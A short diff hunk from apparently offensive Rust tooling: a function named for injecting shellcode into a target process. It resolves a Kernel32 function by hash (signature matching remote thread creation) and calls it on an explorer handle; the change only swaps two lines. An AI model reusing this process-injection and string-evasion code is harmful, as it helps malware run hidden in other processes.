@@ -187,8 +187,8 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
 
     // See line 99
     let function = rco_utils::find_function_address("Kernel32", 0x2a0b247f3bdeef70).unwrap();
-    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
     let function = rco_utils::construct_win32_function!(function; [HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32]; [()]);
+    let start_address_option = unsafe { Some(mem::transmute(base_address)) };
     unsafe { function(
         explorer_handle,
         ptr::null(),
